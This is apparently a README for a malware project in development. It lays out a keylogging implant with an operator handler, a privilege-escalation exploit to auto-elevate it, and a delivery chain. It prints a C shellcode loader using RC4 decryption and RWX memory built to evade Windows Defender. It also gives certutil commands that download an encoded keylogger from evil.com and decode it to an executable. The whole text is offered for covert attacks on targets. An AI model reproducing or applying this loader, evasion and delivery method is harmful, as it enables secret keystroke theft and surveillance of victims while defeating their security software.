## Beta Development 

All files relevant to the development of this project can be found here. 

The directory structure is as follows.

```
└── Beta
    ├── archivist.py
    ├── assets
    │   ├── chroma.py
    │   ├── __init__.py
    │   ├── __init__.pyc
    │   ├── main.py
    │   ├── README.md
    │   ├── tests
    │   │   ├── __init__.py
    │   │   └── upload_test.py
    │   └── uploader
    │       ├── base.py
    │       ├── catbox.py
    │       ├── fileio.py
    │       ├── __init__.py
    │       ├── mixtape.py
    │       └── uguu.py
    ├── binary_to_hex.py
    ├── console.py
    ├── exploits
    │   ├── AV-Evasion
    │   │   ├── AVWinD.exe
    │   │   └── windefexe.c
    │   └── Priv-Esc
    │       ├── ExamplePayload
    │       │   ├── Payload.cpp
    │       │   ├── Payload.exe
    │       │   └── Readme.md
    │       ├── PerformanceMonitorVolatileEnvironmentLPE
    │       │   ├── c_cpp_properties.json
    │       │   ├── PerformanceMonitorVolatileEnvironmentLPE.cpp
    │       │   ├── PerformanceMonitorVolatileEnvironmentLPE.vcxproj
    │       │   └── PerformanceMonitorVolatileEnvironmentLPE.vcxproj.filters
    │       ├── PerformanceMonitorVolatileEnvironmentLPE.sln
    │       └── README.md
    ├── REAME.md
    └── Scripts
        ├── helper.bat
        ├── README.md
        ├── shell.py
        └── shell.vbs

```
### About

`archivist.py` Is the main keylogging implant.
`console.py` Will be Archivists handler, facilitating comms between the implant
and operator.

These files are in active development.

The `binary_to_hex.py` file is here because it will potentially be incorperated into the way the
keylogger is going to be deployed. If you go to the `exploits/AV-Evasion` directory in this repo there will be a C
file there the contents of which look a little like those  below.

```
#include <Windows.h>
#include <rc4.h>

// The encrypted code allows us to get around static scanning
unsigned char buf[] = 
"\x67\xc6\xe9\xe7\x07\x0a\x37\x3b\x63\xf0\xfd\x02\xc3\x23\xcd" // Truncated 
"\xf3\xbe\x80\x69\x18\x24\xb3\xf9\x96\x3e";		       // Truncated 


int main() {
  int lpBufSize = sizeof(int) * 700;
  LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
  memset(lpBuf, '\0', lpBufSize);

  HANDLE proc = OpenProcess(0x1F0FFF, false, 4);
  // Checking NULL allows us to get around Real-time protection
  if (proc == NULL) {
    RC4("vXJDRPBUBnXKFphOMNzDZTCjnpbYhYDIMPBoYGotFWsBegm", buf, (char*) lpBuf, 700);
    void (*func)();
    func = (void (*)()) lpBuf;
    (void)(*func)();
  }

  return 0;
}
```

The payload is represented by the shell code you can see above. This 
shell code can be replaced by custom shell code. Which is what we are going to 
do. 

Once the main logger file has been compiled we will use the `binary_to_hex.py`
script to get a representation of the binary data in hex/shell code. Running
`use windows/windows_defender_exe` in `msfconsole` and setting the payload, to
our custom shell code we will end up with an executable that will attempt to 
make it harder for Windows Defender to get in the way of our keylogging operations.

Of course the keylogger itself has some anti-forensic and AV evasion routines
itself but a little more might be helpful.


Also in the `exploits` directory can be found a C++ file and some related project files.
This is a privilege escalation exploit originally developed by Martin Fischer of Bytecode77.
Whom you can find on github by clicking [here](https://github.com/bytecode77) and
online over at his [website](https://bytecode77.com). (I suggest checking both out
he's got some really cool projects there.)

The exploit makes it so our binary keylogger file gets auto-elevated through Volatile Environment and
perfmon.exe. 


On the question of how to get the malware to the target, i will leave that up
to your imagination. However `Magic Unicorn Attack Vector` by [Dave Kennedy](https://twitter.com/HackingDave)
from [TrustedSec](https://trustedsec.com) has the ability to encode a binary as cert file.

`python unicorn.py <path_to_payload/exe_encode> crt`

The beauty of this is that the `certutil` tool on Windows can be used to both download and
restore the encoded files back to `exe`. If you're able to run:

```
certutil -urlcache -split -f http://evil.com/keylogger.crt keylogger.crt
certutil -decode keylogger.crt keylogger.exe
```

Through remote code execution, or vector of your preference this would be a pretty effective way of delivering the malware.   
